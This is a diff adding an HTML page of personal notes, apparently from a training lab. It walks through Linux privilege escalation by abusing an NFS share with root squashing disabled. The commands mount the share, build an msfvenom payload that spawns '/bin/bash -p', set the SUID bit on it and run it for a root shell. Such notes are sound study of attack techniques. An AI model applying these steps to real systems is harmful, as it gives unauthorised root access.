@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>NFS</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>NFS</h1><br/><p><strong><h1>NFS Share</h1></strong></p><p></p><p>Files created via NFS inherit the remote user&#39;s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the &quot;nobody&quot; user.</p><p></p><p>Check the NFS share configuration on the Debian VM:</p><p></p><p><strong>cat /etc/exports</strong></p><p></p><p>Note that the /tmp share has root squashing disabled.</p><p></p><p>On your Kali box, switch to your root user if you are not already running as root:</p><p></p><p><strong>sudo su</strong></p><p></p><p>Using Kali&#39;s root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):</p><p></p><p><strong>mkdir /tmp/nfs</strong></p><p><strong>mount -o rw,vers=2 10.10.118.8:/tmp /tmp/nfs</strong></p><p></p><p>Still using Kali&#39;s root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):</p><p></p><p><strong>msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</strong></p><p></p><p>Still using Kali&#39;s root user, make the file executable and set the SUID permission:</p><p></p><p><strong>chmod +xs /tmp/nfs/shell.elf</strong></p><p></p><p>Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:</p><p></p><p><strong>/tmp/shell.elf</strong></p><p></p><p>Remember to exit out of the root shell before continuing!</p><p></p><p><strong><h2>END</h2></strong></p></div>
+</body>
+</html>
